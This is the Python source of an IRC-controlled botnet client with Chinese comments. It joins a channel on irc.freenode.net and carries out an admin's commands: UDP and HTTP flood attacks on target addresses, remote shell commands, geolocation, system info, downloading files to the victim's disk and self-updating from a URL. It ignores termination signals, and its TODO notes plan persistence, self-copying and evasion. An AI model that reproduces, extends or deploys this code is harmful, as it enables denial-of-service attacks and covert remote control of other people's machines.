#! /usr/bin/env python
# encoding=utf-8

import os
import re
import sys
import time
import queue
import signal
import socket
import _thread
import payloads

# from django.core.validators import URLValidator   # check url

# who is your name
NICK = ""
# who is boss
ADMIN = ['evilxyz', ]
# server to connect to
SERVER = 'irc.freenode.net'  # irc.freenode.net
# server port
PORT = 6667
# channels to join on startup
CHANNELS = ['##evilxyz', ]
# channels password
PASSWORD = "justforfun"
# allowed instructions
ALLOWED_INSTRUCTIONS = ['.udp1', '.udp2', '.cc1', '.cc2', '.cmd', '.geo', '.info', '.upload', '.reload', '.startup']


# TODO: 将接收信号量改为创建守护进程防杀
# TODO: 在Topic中加入控制命令,使木马系统异步运行,即指令发布后,后上线的主机也可通过Topic来判断需要执行什么指令
# TODO: 自启动后复制自身来指定目录, 然后删除自身
# TODO: 全局变量存储 Windows或Linux 系统变量, 如Windows平台 %SystemRoot%, %Temp%, %Windows%
# TODO: 随机文件名


def line_split(line, num=400):
    """
        if string more than 400, split and store to list
    """
    split_out = []

    while line:
        split_out.append(line[:num])
        line = line[num:]
    return split_out


def check_url(url):
    """
        check the url format
    """
    url_regex = re.compile(r'^(?:http|https)?://'
                           r'(?:(?:[A-Z0-9](?:[A-Z0-9-]{0,61}[A-Z0-9])?\.)+(?:[A-Z]{2,6}\.?|[A-Z0-9-]{2,}\.?)|'
                           r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})'
                           r'(?::\d+)?'
                           r'(?:/?|[/?]\S+)$', re.IGNORECASE)  # ?: 代表可有可无

    if url_regex.findall(url):
        return True
    return False


def signal_handler(signum, frame):
    """
        process signal
    """
    print('Signal handler called with signal', signum)


def name_bot(irc):
    """
        Try to name the bot in order to be recognised on IRC
        irc - an opened socket
        Return the name of the bot
    """
    nick = sys.platform[:3] + '-' + str(int(time.time()))  # platform + timestamp
    real_name = nick[3:]

    irc.send(('NICK ' + nick + '\r\n').encode('utf-8'))
    irc.send(('USER ' + nick + ' ' + nick +
              ' ' + nick + ' :' + real_name + '\r\n').encode('utf-8'))

    while True:
        receive = irc.recv(4096).decode('utf-8')

        if 'Nickname is already in use' in receive:  # try another nickname
            nick = sys.platform[:3] + '-' + str(int(time.time()))
            irc.send(('NICK ' + nick + '\r\n').encode('utf-8'))

        elif nick in receive or 'motd' in receive.lower():
            # successfully connected
            return nick


def create_socket(family=socket.AF_INET, t=socket.SOCK_STREAM, proto=0):
    # Returns an unix socket or returns None
    try:
        irc = socket.socket(family, t, proto)
    except IOError:
        return None

    return irc


def connect_to(address, irc):
    """
    Connect to the specified address through s (a socket object)
    Returns True on success else False
    """
    try:
        irc.connect(address)
    except Exception as e:

        print('Could not connect to {0}\n{1}'.format(address, e))

        return False

    return True


def join_channels(channels, passwd, irc):
    """
    Send a JOIN command to the server through the s socket
    The variable 'channels' is a list of strings that represend the channels to
    be joined (including the # character)

    Returns True if the command was sent, else False
    """
    clist = ','.join(channels)
    try:
        irc.send(('JOIN ' + clist + " " + passwd + '\r\n').encode('utf-8'))
    except Exception as e:

        print('Unexpected error while joining {0}: {1}'.format(clist, e))

        return False

    print('Joined: {0}'.format(clist))

    return True


def quit_bot(irc):
    """
    Send the QUIT commmand through the socket s

    Return True if the command was sent, else False
    """

    try:
        irc.send('QUIT\r\n'.encode('utf-8'))
    except IOError as e:
        content = 'Unexpected error while quitting: {0}'.format(e)
        print(content)

        return False

    return True


def execute_instruction(irc_socket, instruction):
    """
        Execute my instruction


        instruction: {'attack_type': 'udp1',
                    'target_ip': '192.168.9.2',
                    'target_port': '23',
                    'duration': '60',
                    }

        .udp1 ip port duration

        instruction: {'attack_type': 'udp2',
                    'target_ip': '192.168.9.2',
                    'target_port': '80',
                    'duration': '600',
                    'packet_size': '100',
                    'interval': '0.5',
                    }

        .udp2 ip port duration packet_size interval

        instruction: {'attack_type': 'cc1',
                      'target_url': 'http://example.com:8080/path',
                      'duration': '60',
                     }

        .cc1 url duration

        instruction: {'attack_type': 'cc2',
                      'target_url': 'http://example.com:8080/path',
                      'duration': '60',
                      'interval': '0.3',
                     }

        .cc2 url duration interval

        instruction: {'attack_type': '.cmd',
                      'nickname': 'lin-xxxxx',
                      'command': 'ls -al',
                      }
        .cmd lin-xxx ls -al

        .geo lin-xxx

        .reload url

    """
    attack_type = instruction.split()[0]

    if attack_type == '.udp1':
        if check_udp_instruction(instruction):
            instruction = dict(attack_type=instruction.split()[0],
                               target_ip=instruction.split()[1],
                               target_port=instruction.split()[2],
                               duration=instruction.split()[3],
                               )

            payloads.udp1(instruction['target_ip'],
                          instruction['target_port'],
                          instruction['duration'],
                          )

            privmsg(irc_socket, CHANNELS, "UDP flooding %s on port %s for %s seconds." % (
                instruction['target_ip'],
                instruction['target_port'],
                instruction['duration'],
            )
                    )

    elif attack_type == '.udp2':
        if check_udp_instruction(instruction):
            instruction = dict(attack_type=instruction.split()[0],
                               target_ip=instruction.split()[1],
                               target_port=instruction.split()[2],
                               duration=instruction.split()[3],
                               packet_size=instruction.split()[4],
                               interval=instruction.split()[5],
                               )

            payloads.udp2(instruction['target_ip'],
                          instruction['target_port'],
                          instruction['duration'],
                          instruction['packet_size'],
                          instruction['interval'],
                          )

            privmsg(irc_socket, CHANNELS, "UDP flooding %s on port %s for %s seconds." % (
                instruction['target_ip'],
                instruction['target_port'],
                instruction['duration'],
            )
                    )

    elif attack_type == '.cc1':
        if check_cc_instruction(instruction):
            instruction = dict(attack_type=instruction.split()[0],
                               target_url=instruction.split()[1],
                               duration=instruction.split()[2],
                               )
            payloads.cc1(instruction['target_url'],
                         instruction['duration'],
                         )
            privmsg(irc_socket, CHANNELS, "CC Attacking %s for %s seconds." % (
                instruction['target_url'],
                instruction['duration'],
            )
                    )

    elif attack_type == '.cc2':
        if check_cc_instruction(instruction):
            instruction = dict(attack_type=instruction.split()[0],
                               target_url=instruction.split()[1],
                               duration=instruction.split()[2],
                               interval=instruction.split()[3],
                               )
            payloads.cc2(instruction['target_url'],
                         instruction['duration'],
                         instruction['interval'],
                         )
            privmsg(irc_socket, CHANNELS, "CC Attacking %s for %s seconds." % (
                instruction['target_url'],
                instruction['duration'],
            )
                    )
    elif attack_type == '.cmd':
        if check_cmd_instruction(instruction):
            instruction = dict(attack_type=instruction.split()[0],
                               nickname=instruction.split()[1],
                               command=' '.join(instruction.split()[2:]),  # .cmd lin-xxx ip addr
                               )
            # 需要用单独线程执行命令. 最好的方法是单独开启一个进程去执行Attack
            # 开启新线程后执行命令, 利用队列共享线程间数据
            cmd_queue = queue.Queue()
            _thread.start_new_thread(payloads.command_executor,
                                     (cmd_queue, instruction['command']))
            response = cmd_queue.get()  # get execution result

            privmsg(irc_socket, ADMIN, response)

    elif attack_type == '.geo':
        if check_geo_instruction(instruction):
            instruction = dict(attack_type=instruction.split()[0],
                               nickname=instruction.split()[1],
                               )

            geo_queue = queue.Queue()
            _thread.start_new_thread(payloads.geo_locate, (geo_queue,))
            response = geo_queue.get()  # get geo
            privmsg(irc_socket, ADMIN, response)

    elif attack_type == '.reload':  # 需要加上对应的 nickname !!! 否则需要和bot私聊才可reload
        if check_reload_instruction(instruction):
            instruction = dict(attack_type=instruction.split()[0],
                               url=instruction.split()[1],
                               )
            status = payloads.self_update(instruction['url'], )
            if status:
                privmsg(irc_socket, ADMIN, "Update Success !")
            else:
                privmsg(irc_socket, ADMIN, "Update Failed !")

    elif attack_type == '.info':
        if check_info_instruction(instruction):
            instruction = dict(attack_type=instruction.split()[0],
                               nickname=instruction.split()[1],
                               )

            info_queue = queue.Queue()
            _thread.start_new_thread(payloads.system_info, (info_queue,))
            response = info_queue.get()  # get info
            privmsg(irc_socket, ADMIN, response)

    elif attack_type == ".upload":
        if check_upload_instruction(instruction):
            instruction = dict(attack_type=instruction.split()[0],
                               nickname=instruction.split()[1],
                               url=instruction.split()[2],
                               full_path=instruction.split()[3])
            status = payloads.file_upload(instruction['url'], instruction['full_path'])
            if status:
                privmsg(irc_socket, ADMIN, "Upload Success !")
            else:
                privmsg(irc_socket, ADMIN, "Upload Failed !")
    else:
        pass


def check_upload_instruction(instruction):
    # .upload win-xxx http://example.com/test.exe c:\windows\weird.exe
    if instruction.split()[0] in ALLOWED_INSTRUCTIONS:
        if instruction.split()[1] == NICK:
            if check_url(instruction.split()[2]):
                return True

    return False


def check_info_instruction(instruction):
    if instruction.split()[0] in ALLOWED_INSTRUCTIONS:
        if instruction.split()[1] == NICK:
            return True

    return False


def check_reload_instruction(instruction):
    # .url http://example.com/awesome.exe

    if instruction.split()[0] in ALLOWED_INSTRUCTIONS:

        if check_url(instruction.split()[1]):
            return True

    return False


def check_geo_instruction(instruction):
    if instruction.split()[0] in ALLOWED_INSTRUCTIONS:
        if instruction.split()[1] == NICK:
            return True

    return False


def check_cmd_instruction(instruction):  # check cmd format
    if instruction.split()[0] in ALLOWED_INSTRUCTIONS:
        # should check nick is or not in channel
        if instruction.split()[1] == NICK:
            return True

    return False


def check_cc_instruction(instruction):
    # try:
    # .cc1 url duration
    # .cc2 url duration interval

    if instruction.split()[0] in ALLOWED_INSTRUCTIONS:
        if check_url(instruction.split()[1]):
            # 可以加上较验 duration 和 interval
            return True

    return False


def check_udp_instruction(instruction):
    try:
        # .udp1 ip port duration
        # .udp2 ip port duration packetsize interval

        if instruction.split()[0] in ALLOWED_INSTRUCTIONS:  # 分解命令 [.udp1, ip, port, duration]
            if socket.inet_aton(instruction.split()[1]):  # valid ip
                if 1 <= int(instruction.split()[2]) <= 65535:  # valid port

                    return True

    except Exception as err:
        pass

    return False


def check_instruction(instruction):
    try:
        if instruction.split()[0] in ALLOWED_INSTRUCTIONS:
            return True
    except Exception as err:
        pass

    return False


def pong(irc, destination):
    """
        when the server send  ping instruction, must reply pong instruction
    """
    crlf = "\r\n"
    if len(destination):
        irc.send(("PONG :" + destination + crlf).encode('utf-8'))


def privmsg(irc, to, message):
    """
        send instruction
    """
    try:
        if to == CHANNELS or to == ADMIN:
            for line in message.strip().split('\n'):  # 逐行发送
                if len(line) >= 400:
                    split = line_split(line, num=400)
                    for s in split:
                        time.sleep(0.5)
                        irc.send(("PRIVMSG %s :%s%s" % (','.join(to), s, "\r\n")).encode('utf-8'))
                else:
                    time.sleep(0.5)
                    irc.send(("PRIVMSG %s :%s%s" % (','.join(to), line, "\r\n")).encode('utf-8'))
    except Exception as err:
        pass


def parse(msg):
    """
    Returns an IRC command's components

    A dictionary will be filled by the data of the command, the command is as
    follows:
    :sender ACTION action_args :arguments

    sender(string) is the user who sent the command (only the user's nick)

    action(string) can be one of the following: PING, KICK, PRIVMSG, QUIT, etc.
    Check: http://www.irchelp.org/irchelp/rfc/chapter4.html#c4_2

    action_args(list of strings) depends on the ACTION, they are usually the
    channel or the user whom is the command for(see KICK, PRIVMSG, etc.), this
    will be a list and the items in the list will be the words that form the
    actual arguments

    arguments(string) depends on the ACTION

    eg: the command ':foo!foo@domain.tld KICK #chan user :reason' will become:
        sender: 'foo'
        action: 'KICK'
        action_args: ['#chan', 'user']
    """

    components = {
        'sender': '',
        'action': '',
        'receiver': '',
        'arguments': '',
        'instruction': '',
    }

    msg = msg.split('\r\n')[0]
    irc_prefix_rem = re.compile(r'(.*?) (.*?) (.*)').match
    # irc_netmask_rem = re.compile(r':?([^!@]*)!?([^@]*)@?(.*)').match
    irc_param_ref = re.compile(r'(?:^|(?<= ))(:.*|[^ ]+)').findall

    # data format like this
    # command ==> :evilxyz!~xyz@123.178.101.43 PRIVMSG ##evilxyz :.udp1 ip port duration
    # command ==> :evilxyz!~xyz@123.178.101.43 PRIVMSG ##evilxyz :.udp2 ip port duration packetsize interval

    if 'NOTICE' not in msg:  # if not notice message

        if msg.startswith(":"):  # has a prefix
            try:
                prefix, action, params = irc_prefix_rem(msg).groups()

                # print("^" * 10, irc_netmask_rem(prefix).groups())  # 待利用

                components['sender'] = prefix.split(":")[1].split('!')[0]  # 截取发送者, :和!之间的数据
                components['action'] = action  # 控制命令 PRIVMSG, KICK, PING
                components['receiver'] = irc_param_ref(params)[0]  # str.strip(params.split(':')[0])    # 获取##evilxyz
                components['arguments'] = irc_param_ref(params)[1][1:]

                if check_instruction(components['arguments']):  # First check
                    components['instruction'] = components['arguments']

            except IndexError:
                pass

        elif msg.startswith("PING"):
            components['action'] = "PING"
            components['arguments'] = msg.split(':')[1]
        else:
            pass

    else:
        pass

    return components


def run(irc_socket):
    # with concurrent.futures.ProcessPoolExecutor() as executor:
    while True:

        receive = irc_socket.recv(4096).decode('utf-8')

        if receive:
            print("*" * 10, "\n", receive, "*" * 10)
            components = parse(receive)  # parse message
            print('===>', components)

            if 'PING' == components['action']:
                pong(irc_socket, components['arguments'])
            elif 'PRIVMSG' == components['action']:
                if components['instruction']:  # if had instruction
                    if components['sender'] in ADMIN:  # if sender is admin
                        try:
                            instruction = components['instruction']
                            execute_instruction(irc_socket, instruction)

                        except Exception as err:
                            print('^' * 10, err)
                    else:
                        pass
                        # 下面代码是所有bot都执行的...所以...
                        # privmsg(irc_socket, CHANNELS, "This guy => [%s] not admin, but sent => [%s] !"
                        #        % (components['sender'], components['instruction']))
            else:
                pass
        else:
            break


def main():
    while True:
        if sys.platform[:3] == "lin":
            signal.signal(signal.SIGHUP, signal_handler)  # 1
            signal.signal(signal.SIGINT, signal_handler)  # 2
            signal.signal(signal.SIGQUIT, signal_handler)  # 3
            signal.signal(signal.SIGALRM, signal_handler)  # 14
            signal.signal(signal.SIGTERM, signal_handler)  # 15
            signal.signal(signal.SIGCONT, signal_handler)  # 18
        elif sys.platform[:3] == "win":
            # On Windows, signal() can only be called with SIGABRT, SIGFPE, SIGILL, SIGINT, SIGSEGV, or SIGTERM
            signal.signal(signal.SIGTERM, signal_handler)  # 15
        else:
            pass

        # payloads.self_startup()  # start up

        irc_socket = create_socket()  # create irc socket

        if irc_socket and connect_to((SERVER, PORT), irc_socket):  # connect to irc server

            print('PID : ', os.getpid())
            print('Connected to {0}:{1}'.format(SERVER, PORT))

            global NICK
            NICK = name_bot(irc_socket)  # nick name and real name
            joined = join_channels(CHANNELS, PASSWORD, irc_socket)

            if joined:
                run(irc_socket)
            else:
                quit_bot(irc_socket)
                irc_socket.close()

            print('Disconnected from {0}:{1}'.format(SERVER, PORT))

        time.sleep(60)


if '__main__' == __name__:  # pragma: no cover
    main()
